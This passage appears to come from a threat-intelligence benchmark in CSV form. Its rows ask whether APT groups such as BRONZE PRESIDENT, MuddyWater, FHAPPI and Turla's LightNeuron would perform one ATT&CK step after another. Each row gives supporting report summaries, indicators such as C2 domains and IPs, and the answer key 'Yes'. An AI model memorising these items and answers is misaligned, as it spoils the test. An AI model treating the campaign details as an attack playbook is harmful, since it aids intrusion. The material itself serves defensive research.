Others: The 'Document.exe' file, characterized by a Pokemon Megaball image as its icon, was hosted at 'cdtmaster.com[.]br' and downloaded by the 'Z3j.vbs' script. Its sole purpose was to deploy and run the 'Outlook.exe' payload. The 'Outlook.exe' payload, when executed, did not show any immediate signs of activity but opened a listening TCP socket on localhost. The researchers were still analyzing the 'Outlook.exe' sample to determine its true behavior. The attack could not be attributed to a specific threat actor, but there were common TTPs with previous reports, such as the use of shared infrastructure as a drop-server and the use of popular RATs as backdoors. The domain 'cdtmaster.com[.]br' also hosted other suspicious files, including a variant of 'njRAT'. The indicators of compromise included various URLs and IP addresses associated with the campaign, as well as a registry key used for persistence. Yara rules were provided for detection of related malware samples.",Yes,The Enigmatic Roma225 Campaign
2345,39,39-Command and Control-T1095-Non-Application Layer Protocol,"After using scripts named after various file extensions to collect files from specific locations during the Collection phase, is it likely that BRONZE PRESIDENT will have ORat use a raw socket protocol for Command and Control communication?","Command and Control: The group's C2 techniques vary based on the remote access tools used. RCSession communicates with a hard-coded C2 server using a custom protocol, while ORat uses a raw socket protocol. Cobalt Strike uses malleable C2 profiles and connects to multiple C2 domains.","Reconnaissance: The BRONZE PRESIDENT cyberespionage group, likely based in the People's Republic of China (PRC), has been observed targeting non-governmental organizations (NGOs) and political and law enforcement organizations in South and East Asia since mid-2018. The group uses phishing lures related to national security, humanitarian, and law enforcement topics to gather information.
Resource Development: BRONZE PRESIDENT has developed its own remote access tools and also utilizes publicly available tools. The group's infrastructure is linked to entities within the PRC and PRC-based Internet service providers. Tools such as PlugX, historically leveraged by PRC-based groups, are part of their arsenal.
Initial Access: BRONZE PRESIDENT likely uses phishing emails with ZIP attachments containing LNK files as an initial access vector. The group has been observed gaining administrator access to all systems within a targeted business unit and installing remote access tools on a significant number of hosts.
Execution: The group employs a variety of tools for execution, including Cobalt Strike, PlugX, ORat, and RCSession. Cobalt Strike is installed on over 70% of accessible hosts in some intrusions, and RCSession is installed via DLL side-loading.
Persistence: BRONZE PRESIDENT uses WMI event consumers and scheduled tasks to maintain persistence on compromised hosts. The group creates and maintains tasks like the Sysdriver scheduled task to periodically execute payloads.
Privilege Escalation: After compromising a network, BRONZE PRESIDENT elevates privileges and installs malware on a large proportion of systems. The group uses native tools like vssadmin on domain controllers to create volume shadow copies and retrieve NTDS.dit files containing password hashes.
Defense Evasion: BRONZE PRESIDENT takes steps to minimize detection, such as deleting volume shadow copies after use and killing processes post-execution. The group installs malware on many hosts but exercises restraint to avoid detection.
Credential Access: The group collects credentials from high-privilege network accounts and reputationally sensitive accounts, such as social media and webmail accounts. They also extract password hashes from NTDS.dit files for offline exploitation.
Discovery: BRONZE PRESIDENT uses tools like Nmap, Nbtscan, net user, and ping commands to understand network environments and identify opportunities for lateral movement.
Lateral Movement: The group leverages Wmiexec extensively to move laterally and execute WMI commands on remote hosts. They also use net commands to connect to other hosts using compromised credentials.
Collection: BRONZE PRESIDENT targets specific data types and uses custom batch scripts to collate identified files into archives. They use scripts named after various file extensions to collect files from specific locations.
Exfiltration: BRONZE PRESIDENT uses tools like RCSession and Cobalt Strike to exfiltrate archived data. They target specific data types and use custom batch scripts to create lists of files with predefined criteria for exfiltration.
Others: Secureworks Counter Threat Unit researchers have been monitoring BRONZE PRESIDENT activity since mid-2018, with artifacts suggesting network intrusions dating back to 2014. The group's long-term objective appears to be monitoring target networks. BRONZE PRESIDENT's systemic long-term targeting does not align with patriotic or criminal threat groups, suggesting government sponsorship or tolerance.",Yes,BRONZE PRESIDENT Targets NGOs
2348,39,39-Resource Development-T1587-Develop Capabilities,"After using phishing lures related to national security and law enforcement to gather information, is BRONZE PRESIDENT likely to develop custom remote access tools as part of their resource development before using phishing emails with ZIP attachments containing LNK files for initial access?","Resource Development: BRONZE PRESIDENT has developed its own remote access tools and also utilizes publicly available tools. The group's infrastructure is linked to entities within the PRC and PRC-based Internet service providers. Tools such as PlugX, historically leveraged by PRC-based groups, are part of their arsenal.","Reconnaissance: The BRONZE PRESIDENT cyberespionage group, likely based in the People's Republic of China (PRC), has been observed targeting non-governmental organizations (NGOs) and political and law enforcement organizations in South and East Asia since mid-2018. The group uses phishing lures related to national security, humanitarian, and law enforcement topics to gather information.
Initial Access: BRONZE PRESIDENT likely uses phishing emails with ZIP attachments containing LNK files as an initial access vector. The group has been observed gaining administrator access to all systems within a targeted business unit and installing remote access tools on a significant number of hosts.
Execution: The group employs a variety of tools for execution, including Cobalt Strike, PlugX, ORat, and RCSession. Cobalt Strike is installed on over 70% of accessible hosts in some intrusions, and RCSession is installed via DLL side-loading.
Persistence: BRONZE PRESIDENT uses WMI event consumers and scheduled tasks to maintain persistence on compromised hosts. The group creates and maintains tasks like the Sysdriver scheduled task to periodically execute payloads.
Privilege Escalation: After compromising a network, BRONZE PRESIDENT elevates privileges and installs malware on a large proportion of systems. The group uses native tools like vssadmin on domain controllers to create volume shadow copies and retrieve NTDS.dit files containing password hashes.
Defense Evasion: BRONZE PRESIDENT takes steps to minimize detection, such as deleting volume shadow copies after use and killing processes post-execution. The group installs malware on many hosts but exercises restraint to avoid detection.
Credential Access: The group collects credentials from high-privilege network accounts and reputationally sensitive accounts, such as social media and webmail accounts. They also extract password hashes from NTDS.dit files for offline exploitation.
Discovery: BRONZE PRESIDENT uses tools like Nmap, Nbtscan, net user, and ping commands to understand network environments and identify opportunities for lateral movement.
Lateral Movement: The group leverages Wmiexec extensively to move laterally and execute WMI commands on remote hosts. They also use net commands to connect to other hosts using compromised credentials.
Collection: BRONZE PRESIDENT targets specific data types and uses custom batch scripts to collate identified files into archives. They use scripts named after various file extensions to collect files from specific locations.
Command and Control: The group's C2 techniques vary based on the remote access tools used. RCSession communicates with a hard-coded C2 server using a custom protocol, while ORat uses a raw socket protocol. Cobalt Strike uses malleable C2 profiles and connects to multiple C2 domains.
Exfiltration: BRONZE PRESIDENT uses tools like RCSession and Cobalt Strike to exfiltrate archived data. They target specific data types and use custom batch scripts to create lists of files with predefined criteria for exfiltration.
Others: Secureworks Counter Threat Unit researchers have been monitoring BRONZE PRESIDENT activity since mid-2018, with artifacts suggesting network intrusions dating back to 2014. The group's long-term objective appears to be monitoring target networks. BRONZE PRESIDENT's systemic long-term targeting does not align with patriotic or criminal threat groups, suggesting government sponsorship or tolerance.",Yes,BRONZE PRESIDENT Targets NGOs
2350,39,39-Privilege Escalation-T1548-Abuse Elevation Control Mechanism,"After employing scheduled tasks and WMI event consumers for persistence, is BRONZE PRESIDENT likely to use the tool vssadmin to create volume shadow copies and retrieve NTDS.dit files during privilege escalation before taking steps to minimize detection by deleting those shadow copies?","Privilege Escalation: After compromising a network, BRONZE PRESIDENT elevates privileges and installs malware on a large proportion of systems. The group uses native tools like vssadmin on domain controllers to create volume shadow copies and retrieve NTDS.dit files containing password hashes.","Reconnaissance: The BRONZE PRESIDENT cyberespionage group, likely based in the People's Republic of China (PRC), has been observed targeting non-governmental organizations (NGOs) and political and law enforcement organizations in South and East Asia since mid-2018. The group uses phishing lures related to national security, humanitarian, and law enforcement topics to gather information.
Resource Development: BRONZE PRESIDENT has developed its own remote access tools and also utilizes publicly available tools. The group's infrastructure is linked to entities within the PRC and PRC-based Internet service providers. Tools such as PlugX, historically leveraged by PRC-based groups, are part of their arsenal.
Initial Access: BRONZE PRESIDENT likely uses phishing emails with ZIP attachments containing LNK files as an initial access vector. The group has been observed gaining administrator access to all systems within a targeted business unit and installing remote access tools on a significant number of hosts.
Execution: The group employs a variety of tools for execution, including Cobalt Strike, PlugX, ORat, and RCSession. Cobalt Strike is installed on over 70% of accessible hosts in some intrusions, and RCSession is installed via DLL side-loading.
Persistence: BRONZE PRESIDENT uses WMI event consumers and scheduled tasks to maintain persistence on compromised hosts. The group creates and maintains tasks like the Sysdriver scheduled task to periodically execute payloads.
Defense Evasion: BRONZE PRESIDENT takes steps to minimize detection, such as deleting volume shadow copies after use and killing processes post-execution. The group installs malware on many hosts but exercises restraint to avoid detection.
Credential Access: The group collects credentials from high-privilege network accounts and reputationally sensitive accounts, such as social media and webmail accounts. They also extract password hashes from NTDS.dit files for offline exploitation.
Discovery: BRONZE PRESIDENT uses tools like Nmap, Nbtscan, net user, and ping commands to understand network environments and identify opportunities for lateral movement.
Lateral Movement: The group leverages Wmiexec extensively to move laterally and execute WMI commands on remote hosts. They also use net commands to connect to other hosts using compromised credentials.
Collection: BRONZE PRESIDENT targets specific data types and uses custom batch scripts to collate identified files into archives. They use scripts named after various file extensions to collect files from specific locations.
Command and Control: The group's C2 techniques vary based on the remote access tools used. RCSession communicates with a hard-coded C2 server using a custom protocol, while ORat uses a raw socket protocol. Cobalt Strike uses malleable C2 profiles and connects to multiple C2 domains.
Exfiltration: BRONZE PRESIDENT uses tools like RCSession and Cobalt Strike to exfiltrate archived data. They target specific data types and use custom batch scripts to create lists of files with predefined criteria for exfiltration.
Others: Secureworks Counter Threat Unit researchers have been monitoring BRONZE PRESIDENT activity since mid-2018, with artifacts suggesting network intrusions dating back to 2014. The group's long-term objective appears to be monitoring target networks. BRONZE PRESIDENT's systemic long-term targeting does not align with patriotic or criminal threat groups, suggesting government sponsorship or tolerance.",Yes,BRONZE PRESIDENT Targets NGOs
2354,39,39-Discovery-T1046-Network Service Discovery,"After compromising a network through phishing emails containing LNK files and achieving initial access, is BRONZE PRESIDENT likely to escalate privileges using native tools like vssadmin on domain controllers to create volume shadow copies before employing tools such as Nmap and Nbtscan to perform network service discovery?","Discovery: BRONZE PRESIDENT uses tools like Nmap, Nbtscan, net user, and ping commands to understand network environments and identify opportunities for lateral movement.","Reconnaissance: The BRONZE PRESIDENT cyberespionage group, likely based in the People's Republic of China (PRC), has been observed targeting non-governmental organizations (NGOs) and political and law enforcement organizations in South and East Asia since mid-2018. The group uses phishing lures related to national security, humanitarian, and law enforcement topics to gather information.
Resource Development: BRONZE PRESIDENT has developed its own remote access tools and also utilizes publicly available tools. The group's infrastructure is linked to entities within the PRC and PRC-based Internet service providers. Tools such as PlugX, historically leveraged by PRC-based groups, are part of their arsenal.
Initial Access: BRONZE PRESIDENT likely uses phishing emails with ZIP attachments containing LNK files as an initial access vector. The group has been observed gaining administrator access to all systems within a targeted business unit and installing remote access tools on a significant number of hosts.
Execution: The group employs a variety of tools for execution, including Cobalt Strike, PlugX, ORat, and RCSession. Cobalt Strike is installed on over 70% of accessible hosts in some intrusions, and RCSession is installed via DLL side-loading.
Persistence: BRONZE PRESIDENT uses WMI event consumers and scheduled tasks to maintain persistence on compromised hosts. The group creates and maintains tasks like the Sysdriver scheduled task to periodically execute payloads.
Privilege Escalation: After compromising a network, BRONZE PRESIDENT elevates privileges and installs malware on a large proportion of systems. The group uses native tools like vssadmin on domain controllers to create volume shadow copies and retrieve NTDS.dit files containing password hashes.
Defense Evasion: BRONZE PRESIDENT takes steps to minimize detection, such as deleting volume shadow copies after use and killing processes post-execution. The group installs malware on many hosts but exercises restraint to avoid detection.
Credential Access: The group collects credentials from high-privilege network accounts and reputationally sensitive accounts, such as social media and webmail accounts. They also extract password hashes from NTDS.dit files for offline exploitation.
Lateral Movement: The group leverages Wmiexec extensively to move laterally and execute WMI commands on remote hosts. They also use net commands to connect to other hosts using compromised credentials.
Collection: BRONZE PRESIDENT targets specific data types and uses custom batch scripts to collate identified files into archives. They use scripts named after various file extensions to collect files from specific locations.
Command and Control: The group's C2 techniques vary based on the remote access tools used. RCSession communicates with a hard-coded C2 server using a custom protocol, while ORat uses a raw socket protocol. Cobalt Strike uses malleable C2 profiles and connects to multiple C2 domains.
Exfiltration: BRONZE PRESIDENT uses tools like RCSession and Cobalt Strike to exfiltrate archived data. They target specific data types and use custom batch scripts to create lists of files with predefined criteria for exfiltration.
Others: Secureworks Counter Threat Unit researchers have been monitoring BRONZE PRESIDENT activity since mid-2018, with artifacts suggesting network intrusions dating back to 2014. The group's long-term objective appears to be monitoring target networks. BRONZE PRESIDENT's systemic long-term targeting does not align with patriotic or criminal threat groups, suggesting government sponsorship or tolerance.",Yes,BRONZE PRESIDENT Targets NGOs
2355,39,39-Discovery-T1087-Account Discovery,"After BRONZE PRESIDENT collects credentials from high-privilege network accounts and extracts password hashes from NTDS.dit files for offline exploitation, is it likely they will use tools like ""net user"" to understand the network environment and identify potential accounts before leveraging Wmiexec for lateral movement?","Discovery: BRONZE PRESIDENT uses tools like Nmap, Nbtscan, net user, and ping commands to understand network environments and identify opportunities for lateral movement.","Reconnaissance: The BRONZE PRESIDENT cyberespionage group, likely based in the People's Republic of China (PRC), has been observed targeting non-governmental organizations (NGOs) and political and law enforcement organizations in South and East Asia since mid-2018. The group uses phishing lures related to national security, humanitarian, and law enforcement topics to gather information.
Resource Development: BRONZE PRESIDENT has developed its own remote access tools and also utilizes publicly available tools. The group's infrastructure is linked to entities within the PRC and PRC-based Internet service providers. Tools such as PlugX, historically leveraged by PRC-based groups, are part of their arsenal.
Initial Access: BRONZE PRESIDENT likely uses phishing emails with ZIP attachments containing LNK files as an initial access vector. The group has been observed gaining administrator access to all systems within a targeted business unit and installing remote access tools on a significant number of hosts.
Execution: The group employs a variety of tools for execution, including Cobalt Strike, PlugX, ORat, and RCSession. Cobalt Strike is installed on over 70% of accessible hosts in some intrusions, and RCSession is installed via DLL side-loading.
Persistence: BRONZE PRESIDENT uses WMI event consumers and scheduled tasks to maintain persistence on compromised hosts. The group creates and maintains tasks like the Sysdriver scheduled task to periodically execute payloads.
Privilege Escalation: After compromising a network, BRONZE PRESIDENT elevates privileges and installs malware on a large proportion of systems. The group uses native tools like vssadmin on domain controllers to create volume shadow copies and retrieve NTDS.dit files containing password hashes.
Defense Evasion: BRONZE PRESIDENT takes steps to minimize detection, such as deleting volume shadow copies after use and killing processes post-execution. The group installs malware on many hosts but exercises restraint to avoid detection.
Credential Access: The group collects credentials from high-privilege network accounts and reputationally sensitive accounts, such as social media and webmail accounts. They also extract password hashes from NTDS.dit files for offline exploitation.
Lateral Movement: The group leverages Wmiexec extensively to move laterally and execute WMI commands on remote hosts. They also use net commands to connect to other hosts using compromised credentials.
Collection: BRONZE PRESIDENT targets specific data types and uses custom batch scripts to collate identified files into archives. They use scripts named after various file extensions to collect files from specific locations.
Command and Control: The group's C2 techniques vary based on the remote access tools used. RCSession communicates with a hard-coded C2 server using a custom protocol, while ORat uses a raw socket protocol. Cobalt Strike uses malleable C2 profiles and connects to multiple C2 domains.
Exfiltration: BRONZE PRESIDENT uses tools like RCSession and Cobalt Strike to exfiltrate archived data. They target specific data types and use custom batch scripts to create lists of files with predefined criteria for exfiltration.
Others: Secureworks Counter Threat Unit researchers have been monitoring BRONZE PRESIDENT activity since mid-2018, with artifacts suggesting network intrusions dating back to 2014. The group's long-term objective appears to be monitoring target networks. BRONZE PRESIDENT's systemic long-term targeting does not align with patriotic or criminal threat groups, suggesting government sponsorship or tolerance.",Yes,BRONZE PRESIDENT Targets NGOs
2356,39,39-Discovery-T1018-Remote System Discovery,"After BRONZE PRESIDENT elevates privileges and installs malware on systems, is it likely that the group will use tools like Nmap and ping to understand the network environment before extensively leveraging Wmiexec for lateral movement?","Discovery: BRONZE PRESIDENT uses tools like Nmap, Nbtscan, net user, and ping commands to understand network environments and identify opportunities for lateral movement.","Reconnaissance: The BRONZE PRESIDENT cyberespionage group, likely based in the People's Republic of China (PRC), has been observed targeting non-governmental organizations (NGOs) and political and law enforcement organizations in South and East Asia since mid-2018. The group uses phishing lures related to national security, humanitarian, and law enforcement topics to gather information.
Resource Development: BRONZE PRESIDENT has developed its own remote access tools and also utilizes publicly available tools. The group's infrastructure is linked to entities within the PRC and PRC-based Internet service providers. Tools such as PlugX, historically leveraged by PRC-based groups, are part of their arsenal.
Initial Access: BRONZE PRESIDENT likely uses phishing emails with ZIP attachments containing LNK files as an initial access vector. The group has been observed gaining administrator access to all systems within a targeted business unit and installing remote access tools on a significant number of hosts.
Execution: The group employs a variety of tools for execution, including Cobalt Strike, PlugX, ORat, and RCSession. Cobalt Strike is installed on over 70% of accessible hosts in some intrusions, and RCSession is installed via DLL side-loading.
Persistence: BRONZE PRESIDENT uses WMI event consumers and scheduled tasks to maintain persistence on compromised hosts. The group creates and maintains tasks like the Sysdriver scheduled task to periodically execute payloads.
Privilege Escalation: After compromising a network, BRONZE PRESIDENT elevates privileges and installs malware on a large proportion of systems. The group uses native tools like vssadmin on domain controllers to create volume shadow copies and retrieve NTDS.dit files containing password hashes.
Defense Evasion: BRONZE PRESIDENT takes steps to minimize detection, such as deleting volume shadow copies after use and killing processes post-execution. The group installs malware on many hosts but exercises restraint to avoid detection.
Credential Access: The group collects credentials from high-privilege network accounts and reputationally sensitive accounts, such as social media and webmail accounts. They also extract password hashes from NTDS.dit files for offline exploitation.
Lateral Movement: The group leverages Wmiexec extensively to move laterally and execute WMI commands on remote hosts. They also use net commands to connect to other hosts using compromised credentials.
Collection: BRONZE PRESIDENT targets specific data types and uses custom batch scripts to collate identified files into archives. They use scripts named after various file extensions to collect files from specific locations.
Command and Control: The group's C2 techniques vary based on the remote access tools used. RCSession communicates with a hard-coded C2 server using a custom protocol, while ORat uses a raw socket protocol. Cobalt Strike uses malleable C2 profiles and connects to multiple C2 domains.
Exfiltration: BRONZE PRESIDENT uses tools like RCSession and Cobalt Strike to exfiltrate archived data. They target specific data types and use custom batch scripts to create lists of files with predefined criteria for exfiltration.
Others: Secureworks Counter Threat Unit researchers have been monitoring BRONZE PRESIDENT activity since mid-2018, with artifacts suggesting network intrusions dating back to 2014. The group's long-term objective appears to be monitoring target networks. BRONZE PRESIDENT's systemic long-term targeting does not align with patriotic or criminal threat groups, suggesting government sponsorship or tolerance.",Yes,BRONZE PRESIDENT Targets NGOs
2359,390,390-Command and Control-T1071-Application Layer Protocol,"After conducting spear-phishing attacks from February to April 2019 in their initial access phase, is it likely that the MuddyWater APT group utilized a web control server and the infiltration tool muddyc3 for command and control operations before employing the server-based script web.py to process client requests and deliver next-stage payloads?","Command and Control: The MuddyWater APT group utilized a web control server and an infiltration tool named muddyc3, with version number 1.0.0. On June 24, the source code of muddyc3 was leaked on another Telegram channel and related auctions were conducted. Security researchers posted malicious samples and decompiled source code with the same version on Github (https://github.com/0xffff0800/muddyc3). The tool's main body is a server-based script web.py, used to process requests from clients and provide responses. It supports delivering the next stage payload such as sct, hta, and powershell, uploading, downloading, information collection, as well as supported modules.","Initial Access: In early May, hackers claimed to possess attack evidence and information regarding the MuddyWater APT group for sale on the Telegram channel (Channel:GreenLeakers). MuddyWater, a long-lived APT group in the Middle East, launched a series of spear-phishing attacks from February to April 2019 against governments, educational institutions, financial, telecommunications, and defense companies in Turkey, Iran, Afghanistan, Iraq, Tajikistan, and Azerbaijan.
Others: The analysis of the muddyc3 tool revealed that it was generated by PyInstaller in an x64 environment. Two samples named muddyc3.exe were found, with versions 1.0.1 and 1.0.0. The decompiled files, after removing related libraries, indicated that the versions are only slightly different at the code level. The tool requires specifying a C&C server IP and port, and a proxy IP if needed. It supports four commands: list, show, use, and payload, with the show command lacking related processing logic in the code. The initial script payload code can be embedded in a document as a macro, which, when executed by the target, will access the C2 with the specified path. The URL paths for v1.0.0 and v1.0.1 are somewhat different. The tool does not contain the default Powershell payload code, so it is unclear what will be delivered next. The QiAnXin Threat Intelligence Center's RedDrip team will continue monitoring the situation.",Yes,MuddyC3
2360,390,390-Command and Control-T1102-Web Service,Is it likely that the MuddyWater APT group conducted spear-phishing attacks targeting multiple sectors in the Middle East before utilizing a web control server and the muddyc3 tool for Command and Control activities?,"Command and Control: The MuddyWater APT group utilized a web control server and an infiltration tool named muddyc3, with version number 1.0.0. On June 24, the source code of muddyc3 was leaked on another Telegram channel and related auctions were conducted. Security researchers posted malicious samples and decompiled source code with the same version on Github (https://github.com/0xffff0800/muddyc3). The tool's main body is a server-based script web.py, used to process requests from clients and provide responses. It supports delivering the next stage payload such as sct, hta, and powershell, uploading, downloading, information collection, as well as supported modules.","Initial Access: In early May, hackers claimed to possess attack evidence and information regarding the MuddyWater APT group for sale on the Telegram channel (Channel:GreenLeakers). MuddyWater, a long-lived APT group in the Middle East, launched a series of spear-phishing attacks from February to April 2019 against governments, educational institutions, financial, telecommunications, and defense companies in Turkey, Iran, Afghanistan, Iraq, Tajikistan, and Azerbaijan.
Others: The analysis of the muddyc3 tool revealed that it was generated by PyInstaller in an x64 environment. Two samples named muddyc3.exe were found, with versions 1.0.1 and 1.0.0. The decompiled files, after removing related libraries, indicated that the versions are only slightly different at the code level. The tool requires specifying a C&C server IP and port, and a proxy IP if needed. It supports four commands: list, show, use, and payload, with the show command lacking related processing logic in the code. The initial script payload code can be embedded in a document as a macro, which, when executed by the target, will access the C2 with the specified path. The URL paths for v1.0.0 and v1.0.1 are somewhat different. The tool does not contain the default Powershell payload code, so it is unclear what will be delivered next. The QiAnXin Threat Intelligence Center's RedDrip team will continue monitoring the situation.",Yes,MuddyC3
2363,391,391-Defense Evasion-T1027-Obfuscated Files or Information,"After gaining initial access through a VBScript from a phishing email that downloads and executes PowerShell code, is it likely that the FHAPPI campaign will obfuscate files or information using multiple encodings and wraps to evade detection before establishing communication with a C2 server at 'web.outlooksysm.net' located in South Korea?","Defense Evasion: The FHAPPI campaign utilized multiple encodings and wraps to avoid detection, including multilayered base64 encoding. The attack was fileless, avoiding known signatures, and did not originate from the attacker's territory, improving the chances of a successful APT campaign.","Initial Access: The FHAPPI campaign involved an APT phishing email containing a link to malware hosted on a Geocities website. The email's contents are undisclosed due to the sensitive nature of an APT attack. The malware, hosted under the account 'vbiayay1', was a VBScript encoded script. This script, when executed, would download a .doc file and open it, leading to the execution of a PowerShell attack to infect the victim's system with Poison Ivy.
Execution: The VBScript created an object in the shell and executed a PowerShell command to run base64 encoded code. This code led to the download and execution of a .ps1 file from another URL. The .ps1 file contained more base64 encoded code, which, when decoded, revealed the infection code for both 32-bit and 64-bit systems. The malware masqueraded as a 'Security Update' process and used PowerShell to execute the base64 code.
Command and Control: The malware communicated with a C2 server located at the IP address 61.97.243.15, a dial-up IP in South Korea. The domain used for C2 communication was 'web.outlooksysm.net', registered to an individual in China. The WHOIS information for the domain included contact details for 'Liu Ying'.
Others: The FHAPPI campaign was first recognized in Japan and named 'Free Hosting (pivoted) APT PowerSploit Poison Ivy' (FHAPPI). The campaign utilized Geocities Japan for hosting malware and targeted victims with a modified PowerSploit PoC code. The main payload was Poison Ivy, injected into the 'userinit.exe' process. The campaign also targeted Mongolian users with documents in Mongolian. The malware actions included extracting victim information, calling back to a C2 server, and other nefarious activities. The campaign was linked to a larger APT campaign and utilized email addresses 'wisers.data@gmail.com' and 'health.pro.demo30@gmail.com' for phishing. The CNC IP address and the email sender addresses are recommended to be blocked and traced. The malware files associated with the campaign have been deleted with the help of Yahoo Incident Response Division (YIRD), JP-CERT/CC, and other security professionals in Japan.",Yes,english-report-of-fhappi-freehosting
2364,391,391-Defense Evasion-T1564-Hide Artifacts,"After executing encoded PowerShell commands to download and execute payloads from URLs, is it likely that the FHAPPI campaign would utilize fileless techniques to avoid detection before establishing connection with the C2 server at 61.97.243.15?","Defense Evasion: The FHAPPI campaign utilized multiple encodings and wraps to avoid detection, including multilayered base64 encoding. The attack was fileless, avoiding known signatures, and did not originate from the attacker's territory, improving the chances of a successful APT campaign.","Initial Access: The FHAPPI campaign involved an APT phishing email containing a link to malware hosted on a Geocities website. The email's contents are undisclosed due to the sensitive nature of an APT attack. The malware, hosted under the account 'vbiayay1', was a VBScript encoded script. This script, when executed, would download a .doc file and open it, leading to the execution of a PowerShell attack to infect the victim's system with Poison Ivy.
Execution: The VBScript created an object in the shell and executed a PowerShell command to run base64 encoded code. This code led to the download and execution of a .ps1 file from another URL. The .ps1 file contained more base64 encoded code, which, when decoded, revealed the infection code for both 32-bit and 64-bit systems. The malware masqueraded as a 'Security Update' process and used PowerShell to execute the base64 code.
Command and Control: The malware communicated with a C2 server located at the IP address 61.97.243.15, a dial-up IP in South Korea. The domain used for C2 communication was 'web.outlooksysm.net', registered to an individual in China. The WHOIS information for the domain included contact details for 'Liu Ying'.
Others: The FHAPPI campaign was first recognized in Japan and named 'Free Hosting (pivoted) APT PowerSploit Poison Ivy' (FHAPPI). The campaign utilized Geocities Japan for hosting malware and targeted victims with a modified PowerSploit PoC code. The main payload was Poison Ivy, injected into the 'userinit.exe' process. The campaign also targeted Mongolian users with documents in Mongolian. The malware actions included extracting victim information, calling back to a C2 server, and other nefarious activities. The campaign was linked to a larger APT campaign and utilized email addresses 'wisers.data@gmail.com' and 'health.pro.demo30@gmail.com' for phishing. The CNC IP address and the email sender addresses are recommended to be blocked and traced. The malware files associated with the campaign have been deleted with the help of Yahoo Incident Response Division (YIRD), JP-CERT/CC, and other security professionals in Japan.",Yes,english-report-of-fhappi-freehosting
2371,393,393-Initial Access-T1078-Valid Accounts,"After using a PowerShell script to install LightNeuron on the compromised Microsoft Exchange servers for execution, is it likely that Turla will discover system network configurations via LightNeuron's ability to execute functions such as GetAdaptersInfo and GetComputerName before using LightNeuron to collect emails and exfiltrate local files based on specified rules?","Initial Access: Turla, also known as Snake, is believed to have used stolen credentials to deploy LightNeuron, a backdoor specifically designed to target Microsoft Exchange mail servers. This tactic aligns with MITRE ATT&CK technique T1078, Valid Accounts.","Execution: A PowerShell script was utilized to install LightNeuron on the compromised Microsoft Exchange servers, corresponding to MITRE ATT&CK technique T1086, PowerShell.
Privilege Escalation: To obtain administrative rights on the Microsoft Exchange servers, attackers likely used stolen credentials, which is consistent with MITRE ATT&CK technique T1078, Valid Accounts.
Discovery: LightNeuron is capable of executing functions to discover system network configurations, specifically GetAdaptersInfo and GetComputerName, which aligns with MITRE ATT&CK technique T1016, System Network Configuration Discovery.
Collection: LightNeuron can collect all emails matching specified rules in its configuration, as well as exfiltrate any local file using a backdoor function. This behavior corresponds to MITRE ATT&CK techniques T1114, Email Collection, and T1005, Data from Local System. Additionally, LightNeuron can automatically collect files from a specific path, which is related to MITRE ATT&CK technique T1119, Automated Collection.
Command and Control: LightNeuron uses emails for Command and Control (C&C) communication, which is encrypted using AES and aligns with MITRE ATT&CK techniques T1032, Standard Cryptographic Protocol, and T1071, Standard Application Layer Protocol. The C&C data is hidden in PDF documents or JPG images using steganography, which is a form of data obfuscation (MITRE ATT&CK technique T1001).
Exfiltration: Data exfiltration is conducted through the email C&C channel (MITRE ATT&CK technique T1041, Exfiltration Over Command and Control Channel) and can be scheduled to occur during the night or working hours (MITRE ATT&CK technique T1029, Scheduled Transfer). The data is encrypted using AES (MITRE ATT&CK technique T1022, Data Encrypted).",Yes,ESET-LightNeuron
2373,393,393-Discovery-T1016-System Network Configuration Discovery,"After obtaining administrative rights on the Microsoft Exchange servers through the use of stolen credentials, is it likely that LightNeuron will execute the functions GetAdaptersInfo and GetComputerName for system network configuration discovery before collecting all emails matching specific rules and exfiltrating them through an email C&C channel encrypted using AES?","Discovery: LightNeuron is capable of executing functions to discover system network configurations, specifically GetAdaptersInfo and GetComputerName, which aligns with MITRE ATT&CK technique T1016, System Network Configuration Discovery.","Initial Access: Turla, also known as Snake, is believed to have used stolen credentials to deploy LightNeuron, a backdoor specifically designed to target Microsoft Exchange mail servers. This tactic aligns with MITRE ATT&CK technique T1078, Valid Accounts.
Execution: A PowerShell script was utilized to install LightNeuron on the compromised Microsoft Exchange servers, corresponding to MITRE ATT&CK technique T1086, PowerShell.
Privilege Escalation: To obtain administrative rights on the Microsoft Exchange servers, attackers likely used stolen credentials, which is consistent with MITRE ATT&CK technique T1078, Valid Accounts.
Collection: LightNeuron can collect all emails matching specified rules in its configuration, as well as exfiltrate any local file using a backdoor function. This behavior corresponds to MITRE ATT&CK techniques T1114, Email Collection, and T1005, Data from Local System. Additionally, LightNeuron can automatically collect files from a specific path, which is related to MITRE ATT&CK technique T1119, Automated Collection.
Command and Control: LightNeuron uses emails for Command and Control (C&C) communication, which is encrypted using AES and aligns with MITRE ATT&CK techniques T1032, Standard Cryptographic Protocol, and T1071, Standard Application Layer Protocol. The C&C data is hidden in PDF documents or JPG images using steganography, which is a form of data obfuscation (MITRE ATT&CK technique T1001).
Exfiltration: Data exfiltration is conducted through the email C&C channel (MITRE ATT&CK technique T1041, Exfiltration Over Command and Control Channel) and can be scheduled to occur during the night or working hours (MITRE ATT&CK technique T1029, Scheduled Transfer). The data is encrypted using AES (MITRE ATT&CK technique T1022, Data Encrypted).",Yes,ESET-LightNeuron
2374,393,393-Command and Control-T1071-Application Layer Protocol,"After LightNeuron collects emails matching specified rules in its configuration and uses its backdoor functionality to exfiltrate local files through automated collection methods, is it likely to use emails for Command and Control (C&C) communication by aligning its activity with MITRE ATT&CK technique T1071?","Command and Control: LightNeuron uses emails for Command and Control (C&C) communication, which is encrypted using AES and aligns with MITRE ATT&CK techniques T1032, Standard Cryptographic Protocol, and T1071, Standard Application Layer Protocol. The C&C data is hidden in PDF documents or JPG images using steganography, which is a form of data obfuscation (MITRE ATT&CK technique T1001).","Initial Access: Turla, also known as Snake, is believed to have used stolen credentials to deploy LightNeuron, a backdoor specifically designed to target Microsoft Exchange mail servers. This tactic aligns with MITRE ATT&CK technique T1078, Valid Accounts.
Execution: A PowerShell script was utilized to install LightNeuron on the compromised Microsoft Exchange servers, corresponding to MITRE ATT&CK technique T1086, PowerShell.
Privilege Escalation: To obtain administrative rights on the Microsoft Exchange servers, attackers likely used stolen credentials, which is consistent with MITRE ATT&CK technique T1078, Valid Accounts.
Discovery: LightNeuron is capable of executing functions to discover system network configurations, specifically GetAdaptersInfo and GetComputerName, which aligns with MITRE ATT&CK technique T1016, System Network Configuration Discovery.
